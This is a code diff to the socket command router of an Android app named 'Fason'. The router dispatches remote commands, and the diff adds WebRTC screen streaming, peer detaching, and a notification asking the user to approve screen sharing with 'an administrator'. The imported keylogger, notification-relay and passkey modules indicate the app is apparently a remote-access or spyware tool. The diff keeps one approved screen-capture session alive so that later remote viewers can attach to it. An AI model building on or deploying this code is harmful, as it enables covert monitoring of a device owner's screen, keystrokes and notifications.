@@ -29,6 +29,7 @@ import com.fason.app.features.notification.NotificationRelayService;
 import com.fason.app.features.keylogger.KeyloggerDataManager;
 import com.fason.app.features.screen.ConnectionRequestActivity;
 import com.fason.app.features.screen.ScreenCaptureService;
+import com.fason.app.features.screen.WebRtcScreenManager;
 import com.fason.app.service.MainService;
 
 import org.json.JSONArray;
@@ -117,8 +118,10 @@ public final class SocketCommandRouter {
                 case Protocol.MOD_PASSKEY: EXEC.execute(() -> handlePasskey(data, socket)); break;
                 case Protocol.MOD_DEVICE:  EXEC.execute(() -> handleDevice(data, socket)); break;
                 case Protocol.WEBRTC_OFFER:
+                    WEBRTC_EXEC.execute(() -> WebRtcScreenManager.handleOffer(data));
                     break;
                 case Protocol.WEBRTC_ICE:
+                    WEBRTC_EXEC.execute(() -> WebRtcScreenManager.handleRemoteIce(data));
                     break;
             }
         } catch (Exception ignored) {}
@@ -419,30 +422,25 @@ public final class SocketCommandRouter {
             case Protocol.ACT_START:
                 WEBRTC_EXEC.execute(() -> {
                     if (ScreenCaptureService.Companion.isStreaming()) {
-                        stopScreenCapture();
+                        // Keep the one Android-approved MediaProjection alive. A
+                        // new WebRTC offer only replaces the network peer.
+                        WebRtcScreenManager.emitCurrentStatus();
+                    } else {
+                        handler.post(() -> showConnectionNotification(data.optString("sessionId"), socket));
                     }
-
-                    showConnectionNotification();
                 });
+                break;
+
+            case "detach":
+                WEBRTC_EXEC.execute(() -> WebRtcScreenManager.detachPeer(data.optString("sessionId")));
                 break;
 
             case Protocol.ACT_STOP:
-                WEBRTC_EXEC.execute(() -> stopScreenCapture());
+                WEBRTC_EXEC.execute(SocketCommandRouter::stopScreenCaptureNow);
                 break;
 
             case Protocol.ACT_STATUS:
-                EXEC.execute(() -> {
-                    try {
-                        JSONObject status = new JSONObject();
-                        status.put(Protocol.KEY_TYPE, Protocol.KEY_STATUS);
-                        status.put(Protocol.KEY_STREAMING, ScreenCaptureService.Companion.isStreaming());
-                        status.put(Protocol.KEY_SCREEN_W, ScreenCaptureService.Companion.getScreenWidth());
-                        status.put(Protocol.KEY_SCREEN_H, ScreenCaptureService.Companion.getScreenHeight());
-                        status.put(Protocol.KEY_ACCESSIBLE, ScreenCaptureService.isRemoteControlAvailable());
-                        status.put("densityDpi", ScreenCaptureService.Companion.getScreenDensityDpi());
-                        emit(socket, Protocol.SCREEN, status);
-                    } catch (Exception ignored) {}
-                });
+                WebRtcScreenManager.emitCurrentStatus();
                 break;
         }
     }
@@ -715,13 +713,53 @@ public final class SocketCommandRouter {
         } catch (Exception ignored) {}
     }
 
-    private static void showConnectionNotification() {
+    private static void showConnectionNotification(String sessionId, Socket socket) {
         android.content.Context ctx = FasonApp.getContext();
         try {
             Intent intent = new Intent(ctx, com.fason.app.features.screen.ConnectionRequestActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-            ctx.startActivity(intent);
-        } catch (Exception ignored) {}
+            android.app.PendingIntent pendingIntent = android.app.PendingIntent.getActivity(
+                ctx,
+                1003,
+                intent,
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE
+            );
+            android.app.NotificationManager manager =
+                (android.app.NotificationManager) ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
+            if (manager != null) {
+                String channelId = "RemoteDesktopRequest";
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && manager.getNotificationChannel(channelId) == null) {
+                    android.app.NotificationChannel channel = new android.app.NotificationChannel(
+                        channelId,
+                        "Remote desktop requests",
+                        android.app.NotificationManager.IMPORTANCE_HIGH
+                    );
+                    channel.setDescription("Requests to share this device screen with an administrator");
+                    manager.createNotificationChannel(channel);
+                }
+                androidx.core.app.NotificationCompat.Builder builder =
+                    new androidx.core.app.NotificationCompat.Builder(ctx, channelId)
+                        .setSmallIcon(com.fason.app.R.mipmap.ic_launcher)
+                        .setContentTitle("Remote desktop request")
+                        .setContentText("Tap to approve encrypted screen sharing")
+                        .setContentIntent(pendingIntent)
+                        .setAutoCancel(true)
+                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
+                        .setCategory(androidx.core.app.NotificationCompat.CATEGORY_CALL);
+                manager.notify(1003, builder.build());
+
+                JSONObject status = new JSONObject();
+                status.put(Protocol.KEY_TYPE, Protocol.KEY_STATUS);
+                status.put(Protocol.KEY_STREAMING, false);
+                status.put("connectionState", "awaiting-permission");
+                status.put("transport", "webrtc");
+                status.put("sessionId", sessionId);
+                emit(socket, Protocol.SCREEN, status);
+            }
+        } catch (Exception ignored) {
+            try { ctx.startActivity(new Intent(ctx, ConnectionRequestActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); }
+            catch (Exception ignoredAgain) {}
+        }
     }
 
     public static synchronized void shutdown() {
@@ -757,13 +795,16 @@ public final class SocketCommandRouter {
     }
 
     public static void stopScreenCapture() {
-        WEBRTC_EXEC.execute(() -> {
-            try {
-                android.content.Context ctx = FasonApp.getContext();
-                Intent intent = new Intent(ctx, ScreenCaptureService.class);
-                intent.setAction("STOP");
-                ctx.startService(intent);
-            } catch (Exception ignored) {}
-        });
+        WEBRTC_EXEC.execute(SocketCommandRouter::stopScreenCaptureNow);
     }
+
+    private static void stopScreenCaptureNow() {
+        try {
+            android.content.Context ctx = FasonApp.getContext();
+            Intent intent = new Intent(ctx, ScreenCaptureService.class);
+            intent.setAction(ScreenCaptureService.ACTION_STOP);
+            ctx.startService(intent);
+        } catch (Exception ignored) {}
+    }
+
 }
